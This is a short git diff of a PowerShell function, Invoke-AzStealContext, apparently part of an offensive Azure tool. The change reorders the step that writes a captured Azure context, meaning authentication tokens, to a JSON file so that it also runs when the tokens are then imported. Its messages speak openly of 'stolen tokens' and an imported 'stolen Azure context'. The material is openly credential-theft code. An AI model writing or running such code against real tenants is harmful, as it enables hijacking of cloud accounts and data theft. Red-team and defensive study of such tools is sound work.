@@ -97,13 +97,13 @@ Function Invoke-AzStealContext {
     }
     End {
         Try {
+            $AzureRmContext | ConvertTo-Json -Depth 100 | Set-Content $(Join-Path $Path $OutFile)
             If ($ImportContext) {
                 [void](Import-AzContext -Profile $(Join-Path $Path "StolenTokens.json"))
                 Write-Host "Imported stolen Azure context."
                 $((Get-AzContext).Account | Format-Table -AutoSize ID, Type, ExtendedProperties)
             }
             Else {
-                $AzureRmContext | ConvertTo-Json -Depth 100 | Set-Content $(Join-Path $Path $OutFile)
                 Write-Host "Created stolen Azure context file. Run `'Import-AzContext -Profile $(Join-Path $Path $OutFile)`' to import the context."
             }
         } Catch {
